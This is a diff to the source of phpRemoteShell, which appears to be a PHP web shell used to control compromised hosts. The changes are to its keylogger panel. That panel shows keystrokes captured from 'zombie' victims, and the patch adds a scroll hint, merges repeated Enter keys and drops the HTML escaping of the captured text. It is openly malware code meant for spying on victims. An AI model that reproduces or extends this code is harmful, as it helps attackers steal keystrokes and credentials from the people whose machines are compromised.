@@ -22,7 +22,7 @@
   if (!class_exists ('phpRemoteShell')){
 
   define ('APP_NAME', 'phpRemoteShell');
-  define ('APP_VERSION', '0.12.1git201906051');
+  define ('APP_VERSION', '0.12.1git201906111');
 
   // Main configuration array
   $config = array ();
@@ -2417,6 +2417,7 @@
 
         $output .= "
           <table width=850><caption>Keylogger</caption>
+          <tr><td colspan=2 align=center>Scroll at the end to see the new catches&nbsp;!</td></tr>
           <tr><td><textarea rows=18 cols=100>";
 
         if ($data = $this->fix_magic_quotes ($this->read_file ($kl_file)))
@@ -2439,6 +2440,7 @@
             $arr[$c[0]] = $c[1];
           }
 
+          $last_c = '';
           for ($j = 0; $j_real < count ($arr); $j++)
           {
             if (!isset ($arr[$j]))
@@ -2449,7 +2451,7 @@
             $j_real++;
             $c = explode ('-', $arr[$j]);
 
-            // TODO: manage other special keys
+            // TODO Manage other special keys
             if ($c[1] == 'S')
             {
               switch ($c[0])
@@ -2493,22 +2495,28 @@
               $this->build_kl_internal_message ($kl_chars, $i, 
                 'ZOMBIE HAS GONE AWAY TO ANOTHER DOMAIN!');
             }
+            // FIXME Add UTF-8 support
             else
             {
-              if ($i == $i_real)
+              if (!($last_c == 13 && $c[0] == 13))
               {
-                $kl_chars[$i++] = chr ($c[0]);
+                if ($i == $i_real)
+                {
+                  $kl_chars[$i++] = chr ($c[0]);
+                }
+                else
+                {
+                  array_splice ($kl_chars, $i++, 0, chr ($c[0]));
+                }
               }
-              else
-              {
-                array_splice ($kl_chars, $i++, 0, chr ($c[0]));
-              }
+
+              $last_c = $c[0];
 
               $i_real++;
             }
           }
 
-          $output .= $this->htmlentities (implode ('', $kl_chars));
+          $output .= implode ('', $kl_chars);
         }
 
         $output .= "
